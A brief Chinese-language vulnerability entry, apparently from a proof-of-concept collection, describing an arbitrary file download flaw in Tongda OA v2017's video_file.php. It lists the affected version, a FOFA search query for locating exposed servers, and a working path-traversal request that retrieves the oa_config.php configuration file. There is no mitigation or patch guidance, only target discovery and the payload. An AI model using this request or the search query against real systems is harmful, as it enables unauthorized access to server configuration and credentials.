# 通达OA v2017 video_file.php 任意文件下载漏洞

## 漏洞描述

通达OA v2017 video_file.php文件存在任意文件下载漏洞，攻击者通过漏洞可以读取服务器敏感文件

## 漏洞影响

```
通达OA v2017
```

## FOFA

```
app="TDXK-通达OA"
```

## 漏洞复现

验证POC

```
/general/mytable/intel_view/video_file.php?MEDIA_DIR=../../../inc/&MEDIA_NAME=oa_config.php	
```